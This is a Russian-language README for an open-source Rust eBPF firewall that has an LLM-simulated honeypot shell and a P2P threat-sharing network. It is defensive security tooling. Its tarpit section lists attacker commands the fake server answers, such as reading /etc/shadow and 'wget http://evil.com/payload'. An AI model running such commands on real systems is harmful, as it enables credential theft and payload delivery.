<p align="center">
  <strong>🌐 Язык:</strong>
  <a href="README.md">English</a> |
  <a href="README_UA.md">Українська</a> |
  <a href="README_RU.md">Русский</a>
</p>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=JetBrains+Mono&weight=800&size=45&duration=3000&pause=1000&color=FF0000&center=true&vCenter=true&width=600&lines=THE+BLACKWALL" alt="The Blackwall">
  <br>
  <em>Адаптивный eBPF файрвол с AI-ханипотом и P2P сетью угроз</em>
</p>

# The Blackwall — Я построил настоящий Блэквол, потому что Cyberpunk 2077 сломал мне мозг

<p align="center">
<img src="https://img.shields.io/badge/language-Rust-orange?style=for-the-badge&logo=rust" />
<img src="https://img.shields.io/badge/kernel-eBPF%2FXDP-blue?style=for-the-badge" />
<img src="https://img.shields.io/badge/AI-Ollama%20LLM-green?style=for-the-badge" />
<img src="https://img.shields.io/badge/P2P-libp2p-purple?style=for-the-badge" />
<img src="https://img.shields.io/badge/vibe-Cyberpunk-red?style=for-the-badge" />
</p>

<p align="center">
<em>"За Блэкволом есть вещи, от одного взгляда на которые у нетраннера выгорит мозг."</em><br>
<strong>— Альт Каннингем, наверное</strong>
</p>

<p align="center">
<strong>Сейчас строю enterprise AI-автоматизацию в <a href="https://dokky.com.ua">Dokky</a></strong><br>
<strong>Enterprise лицензирование и консалтинг: <a href="mailto:xzcrpw1@gmail.com">xzcrpw1@gmail.com</a></strong>
</p>

---

**TL;DR:** Играл в Cyberpunk, вдохновился, написал целый адаптивный файрвол, работающий внутри ядра Linux, ловящий угрозы с помощью AI, заманивающий атакующих в фейковый сервер на базе LLM, и делящийся threat intelligence через децентрализованную P2P-сеть.
**~21к строк Rust. 298 тестов. 10 крейтов. Один человек.**

---

## Что это?

**The Blackwall** — назван в честь цифрового барьера из Cyberpunk 2077, который не даёт диким AI пожрать цивилизованный Нет.

Моя версия. Многоуровневая система защиты, которая не просто блокирует угрозы — она их изучает, ловит в ловушку и рассказывает о них каждому другому узлу.

Три ключевых уровня, работающих вместе:

**1. Файрвол на уровне ядра (eBPF/XDP)** — анализ пакетов происходит внутри ядра Linux ещё до того, как трафик попадёт в сетевой стек. Решения за наносекунды. Энтропийный анализ, TLS-фингерпринтинг, глубокая инспекция пакетов, рейт-лимитинг, трекинг соединений — всё работает в BPF виртуальной машине.

**2. AI-ханипот (Tarpit)** — вместо того, чтобы просто дропать вредоносный трафик, он перенаправляется на фейковый Linux-сервер. LLM симулирует bash, отвечает на команды, отдаёт фейковые файлы, играет роль скомпрометированного `root@web-prod-03`. Атакующие тратят время, пока всё записывается.

**3. P2P сеть угроз (HiveMind)** — узлы находят друг друга, обмениваются IoC через зашифрованную libp2p-сеть, голосуют за угрозы через консенсус, отслеживают репутацию пиров. Одна нода ловит сканер — все остальные узнают за секунды.

Плюс: распределённый контроллер сенсоров, API для интеграции с SIEM (STIX/TAXII/Splunk/QRadar/CEF), TUI-дашборд, поведенческий профайлинг по IP, ингест threat-фидов, PCAP-форензика.

---

## Архитектура

![Blackwall Architecture](assets/architecture.svg)

![Threat Signal Flow](assets/signal-flow.svg)

**Пайплайн:**

```
Пакет приходит
  → XDP: энтропия, блоклист/вайтлист, CIDR, рейт-лимит, JA4, DPI
  → RingBuf (zero-copy) → Демон в юзерспейсе
  → Статические правила → Поведенческий автомат → JA4 БД → LLM классификация
  → Вердикт: PASS / DROP / REDIRECT_TO_TARPIT
  → eBPF BLOCKLIST обновляется в реальном времени
  → IoC шарится в HiveMind P2P-сеть
```

---

## Что делает каждый крейт

### blackwall-ebpf — Уровень ядра (1,334 строки)

eBPF-программы на XDP-хуке — самая ранняя точка, где можно тронуть пакет. Работает под жёсткими правилами BPF-верификатора: 512 байт стека, без хипа, без float, только ограниченные циклы.

- **Расчёт энтропии** — частотный анализ байтов, целочисленная энтропия Шеннона (0–7936). Высокая энтропия на не-TLS портах → зашифрованный C2-трафик
- **TLS-фингерпринтинг** — парсит ClientHello, извлекает cipher suites, extensions, ALPN, SNI → JA4-отпечаток. Один фингерпринт покрывает тысячи ботов с одной TLS-либой
- **DPI через tail calls** — `PROG_ARRAY` диспатчит протокольные анализаторы:
  - HTTP: метод + URI (ловит `/wp-admin`, `/phpmyadmin`, path traversal)
  - DNS: длина запроса + количество меток (детекция DNS-туннелирования)
  - SSH: фингерпринтинг баннера (`libssh`, `paramiko`, `dropbear`)
- **DNAT-редирект** — подозрительный трафик тихо NAT'ится на тарпит. Атакующий не знает, что покинул реальный сервер
- **Трекинг соединений** — stateful TCP-мониторинг, LRU-мап (16K записей)
- **Рейт-лимитинг** — per-IP token bucket, предотвращает флуд и переполнение RingBuf
- **4 RingBuf-канала** — EVENTS, TLS_EVENTS, EGRESS_EVENTS, DPI_EVENTS

Мапы: `BLOCKLIST`, `ALLOWLIST`, `CIDR_RULES`, `COUNTERS`, `RATE_LIMIT`, `CONN_TRACK`, `NAT_TABLE`, `TARPIT_TARGET`, `PROG_ARRAY`, плюс 4 RingBuf-мапы.

### blackwall — Мозг (6,362 строки)

Главный демон. Загружает eBPF-программы, потребляет события из RingBuf, запускает пайплайн принятия решений.

- **Rules engine** — статический блоклист/вайтлист, CIDR-диапазоны из конфига + фиды
- **Поведенческий автомат** — профайлинг по IP: частота соединений, разнообразие портов, распределение энтропии, анализ тайминга. Фазы: `New → Suspicious → Malicious → Blocked` (или `→ Trusted`). Детекция биконинга через целочисленный CoV
- **JA4-база** — матчинг TLS-фингерпринтов с известными вредоносными сигнатурами
- **AI-классификация** — интеграция с Ollama, модели ≤3B параметров (Qwen3 1.7B/0.6B). Батчинг событий, структурированные JSON-вердикты
- **Threat-фиды** — ингест внешних фидов (Firehol, abuse.ch)
- **PCAP-захват** — форензик-запись с ротацией + компрессией
- **Обратная связь в реальном времени** — вердикты пишутся обратно в eBPF BLOCKLIST
- **HiveMind-бридж** — подтверждённые IoC шарятся в P2P-сеть

### tarpit — Ловушка (2,179 строк)

Уровень обмана. Атакующие, перенаправленные сюда через DNAT, думают, что попали на реальный сервер.

- **Автодетекция протокола** — определяет SSH, HTTP, MySQL, DNS по первым байтам
- **Хендлеры протоколов:**
  - SSH: баннер, авторизация, PTY-сессия
  - HTTP: фейковый WordPress, `/wp-admin`, `.env`, реалистичные хедеры
  - MySQL: хендшейк, авторизация, ответы с фейковыми данными
  - DNS: правдоподобные ответы на запросы
- **LLM-симуляция bash** — каждая команда → Ollama. `ls -la` возвращает файлы, `cat /etc/shadow` — хеши, `wget` — "скачивает", `mysql -u root` — "подключается". LLM не знает, что это ханипот
- **Экспоненциальный джиттер** — чанки 1-15 байт, задержка 100мс–30с. Максимум потраченного времени
- **Анти-фингерпринтинг** — рандомизированные TCP window, TTL, начальная задержка. p0f/Nmap не распознают
- **Защита от prompt injection** — 25+ паттернов, симуляция никогда не ломается
- **Credential canaries** — все введённые креды логируются
- **Управление сессиями** — состояние по соединению, история команд, трекинг CWD

### hivemind — Сеть (6,526 строк)

Децентрализованный threat intelligence на libp2p.

- **Транспорт** — QUIC + Noise-шифрование, каждое соединение аутентифицировано
- **Обнаружение пиров** — Kademlia DHT (глобальный), mDNS (локальный), конфигурируемые seed-пиры
- **Обмен IoC** — GossipSub pub/sub, распространение по сети за секунды
- **Консенсус** — N независимых подтверждений обязательны. Никакого одноисточникового доверия
- **Репутация** — пиры зарабатывают реп за хорошие IoC, теряют за фолсы. Плохие акторы слешатся
- **Защита от Sybil** — PoW-челленджи, детекция самоссылок в k-buckets, рейт-лимит регистрации
- **Федеративное обучение** — локальный тренинг + FedAvg-агрегация, шаринг градиентов (FHE-стаб)
- **Защита от data poisoning** — мониторинг распределения градиентов, детекция model inversion
- **ZKP-инфраструктура** — Groth16 стабы для trustless-верификации IoC

### hivemind-api — Enterprise-интеграция (2,711 строк)

REST API для подключения HiveMind-данных к корпоративным SIEM.

- **STIX 2.1** — стандартный формат threat intelligence
- **TAXII 2.1** — протокол обмена угрозами
- **Splunk HEC** — HTTP Event Collector
- **QRadar LEEF** — Log Event Extended Format
- **CEF** — Common Event Format
- **Тирированное лицензирование** — Basic / Professional / Enterprise / NationalSecurity
- **Лайв-статистика** — XDP-каунтеры + P2P-метрики в реальном времени

### hivemind-dashboard — Монитор (571 строка)

TUI-дашборд. Чистый ANSI — без ratatui, без crossterm, сырые escape-коды. Лайв-статус сети.

### blackwall-controller — Командный центр (356 строк)

CLI для управления несколькими сенсорами. HMAC-аутентификация (PSK). Статистика, список заблокированных IP, здоровье всех нод из одного места.

### common — Контракт (1,126 строк)

`#[repr(C)]` типы между ядром и юзерспейсом: `PacketEvent`, `RuleKey`, `TlsComponentsEvent`, `DpiEvent`, каунтеры, base64. Контракт, на котором построена вся система.

### xtask — Билд-тулы (46 строк)

`cargo xtask build-ebpf` — компиляция nightly + `bpfel-unknown-none`.

---

## Стек технологий

| Уровень | Технология | Почему |
|---------|-----------|--------|
| Ядро | **aya-rs** (eBPF/XDP) | Чистый Rust eBPF — без C, без libbpf |
| Рантайм | **Tokio** (current_thread) | Однопоточный, без оверхеда |
| IPC | **RingBuf** | Zero-copy, 7.5% оверхед против 35% у PerfEventArray |
| Конкурентность | **papaya** + **crossbeam** | Lock-free мапы + MPMC-очереди |
| P2P | **libp2p** | QUIC, Noise, Kademlia, GossipSub, mDNS |
| Крипта | **ring** | ECDSA, SHA256, HKDF, HMAC |
| HTTP | **hyper** 1.x | Минимальный. Без веб-фреймворков |
| AI | **Ollama** | Локальный инференс, GGUF-квантизация |
| Конфиг | **TOML** | Читабельный, минимальный |
| Логирование | **tracing** | Структурированное. Zero `println!` в проде |

**22 зависимости.** Каждая обоснована. Без bloat-крейтов.

---

## Деплой

```
deploy/
  docker/
    Dockerfile.blackwall       # Multi-stage, stripped binary
    Dockerfile.ebpf            # Nightly eBPF build
  helm/
    blackwall/                 # K8s DaemonSet + ConfigMap
  systemd/
    server/                    # Серверные юниты
    laptop/                    # Dev/ноутбук юниты
  examples/                    # Примеры конфигов
  healthcheck.sh               # Проверка компонентов
```

Docker multi-stage. Helm для K8s (DaemonSet, один на ноду, `CAP_BPF`). systemd для bare metal.

---

## Быстрый старт

### Требования

- Linux 5.15+ с BTF (или WSL2 с кастомным ядром)
- Rust stable + nightly с `rust-src`
- `bpf-linker` — `cargo install bpf-linker`
- Ollama (опционально, для AI)

### Сборка

```bash
cargo xtask build-ebpf                      # eBPF (nightly)
cargo build --release --workspace            # весь юзерспейс
cargo clippy --workspace -- -D warnings      # линт
cargo test --workspace                       # 298 тестов
```

### Запуск

```bash
sudo RUST_LOG=info ./target/release/blackwall config.toml    # нужен root/CAP_BPF
RUST_LOG=info ./target/release/tarpit                        # ханипот
RUST_LOG=info ./target/release/hivemind                      # P2P-нода
RUST_LOG=info ./target/release/hivemind-api                  # API threat-фидов
./target/release/hivemind-dashboard                          # TUI
BLACKWALL_PSK=<key> ./target/release/blackwall-controller stats <ip>:<port>
```

### Конфиг

```toml
[network]
interface = "eth0"
xdp_mode = "generic"

[thresholds]
entropy_anomaly = 6000

[tarpit]
enabled = true
port = 2222
base_delay_ms = 100
max_delay_ms = 30000

[tarpit.services]
ssh_port = 22
http_port = 80
mysql_port = 3306
dns_port = 53

[ai]
enabled = true
ollama_url = "http://localhost:11434"
model = "qwen3:1.7b"
fallback_model = "qwen3:0.6b"

[rules]
blocklist = ["1.2.3.4"]
allowlist = ["127.0.0.1"]

[feeds]
enabled = true
refresh_interval_secs = 3600

[pcap]
enabled = true
output_dir = "/var/lib/blackwall/pcap"

[distributed]
enabled = false
mode = "standalone"
bind_port = 9471
psk = "your-256bit-hex-key"
```

---

## Тарпит в действии

Подключаешься к тарпиту и видишь:

```
Ubuntu 24.04.2 LTS web-prod-03 tty1

web-prod-03 login: root
Password:
Last login: Thu Mar 27 14:22:33 2025 from 10.0.0.1

root@web-prod-03:~#
```

Ничего из этого не существует. LLM играет в bash. `ls` — файлы. `cat /etc/passwd` — юзеры. `mysql -u root -p` — подключение. `wget http://evil.com/payload` — загрузка.

30 минут на сервере, которого нет. Каждый кейстрок записан. IoC расшарены в сеть.

---

## Модель безопасности

- Каждый байт из пакетов = контролируемый атакующим. Все `ctx.data()` с bounds-check
- Zero `unwrap()` в проде — `?`, `expect("reason")`, или `match`
- Prompt injection: ожидается. 25+ паттернов ловится, симуляция не ломается
- P2P: Sybil guard (PoW + слешинг репутации), N-of-M консенсус по IoC
- Тарпит: TCP-рандомизация — p0f/Nmap не смогут зафингерпринтить
- Контроллер: HMAC-аутентифицированный, без неавторизованного доступа
- Ядро: рейт-лимитинг предотвращает переполнение RingBuf
- Шатдаун: чистит правила фаервола, никаких осиротевших iptables-записей

---

## Enterprise-версия

**[Blackwall Enterprise](https://github.com/xzcrpw/blackwall-enterprise)** добавляет то, чего нет ни у кого: **анализ Agent-to-Agent (A2A) трафика в реальном времени на уровне ядра.**

AI-агенты начинают общаться друг с другом — LLM-to-LLM, через MCP, A2A-протокол, агентные фреймворки. Это новая поверхность атаки: prompt injection через межагентную коммуникацию, подделка интентов, кража идентичности агентов. На рынке ничего для этого нет. Blackwall Enterprise — первый и единственный такой модуль.

**~8,400 строк Rust.** Отдельный репозиторий, отдельная лицензия.

| Компонент | Что делает |
|-----------|-----------|
| **A-JWT Валидация** | Верификация Agentic JWT по IETF-драфту. Проверка подписи через `ring`, предотвращение реплея, кеширование ключей |
| **Верификация интентов** | Исчерпывающий матчинг полей — `max_amount`, `allowed_recipients` (glob), allowlist действий |
| **Чексума агента** | SHA256(system_prompt + tools_config) — тамперинг = мгновенный блок |
| **Proof-of-Possession** | cnf/jwk ECDSA-привязка — доказывает, что агент держит свой ключ |
| **eBPF Uprobes** | Хуки в OpenSSL/GnuTLS `SSL_write`/`SSL_read` — перехватывает A2A-плейнтекст без разрыва TLS |
| **Risk-Based Routing** | Конфигурируемые policy: allow / review / block по уровню риска |
| **ZK Proofs** | Аттестация нарушений без раскрытия сырого трафика (Groth16) |
| **P2P Gossip** | Proof нарушений бродкастятся в HiveMind-меш |

**Лицензирование:** [xzcrpw1@gmail.com](mailto:xzcrpw1@gmail.com)

---

## Статистика

```
Язык:            100% Rust
Всего:           ~21,200 строк
Файлов:          92 .rs
Крейтов:         10
Тестов:          298
unwrap():        0 в проде
Зависимостей:    22 (проаудированные)
eBPF-стек:       ≤ 512 байт всегда
Clippy:          -D warnings, ноль проблем
CI:              check + clippy + tests + eBPF nightly build
```

---

## Киберпанк-справочник

| Cyberpunk 2077 | Этот проект |
|----------------|-----------|
| The Blackwall | Файрвол на уровне ядра eBPF/XDP |
| ICE | XDP fast-path: энтропия + JA4 + DPI + DNAT |
| Демоны | LLM-тарпит — фейковый сервер за стеной |
| NetWatch | Поведенческий движок + автомат по IP |
| Rogue AIs | Ботнеты, сканеры, C2-биконы |
| Braindance | PCAP-форензика |
| Коллектив нетраннеров | HiveMind P2P-меш |
| Инфа от фиксеров | Threat-фиды |
| Arasaka C&C | Распределённый контроллер |

---

## Дисклеймер

Исследовательский проект в сфере безопасности. Для защиты вашей собственной инфраструктуры. Не используйте против других.

Не аффилирован с CD Projekt Red. Просто игра, которая перепрошила мой мозг наилучшим образом.

---

## Лицензия

**BSL 1.1** (Business Source License)

Лицензиар: Vladyslav Soliannikov
Change Date: April 8, 2030
Change License: Apache-2.0

---

<p align="center">
<strong>Нравится? <a href="https://github.com/xzcrpw/blackwall">Ставь звезду</a></strong>
</p>

<p align="center">
<strong><em>"Просыпайся, самурай. У нас сеть — защищать."</em></strong>
</p>
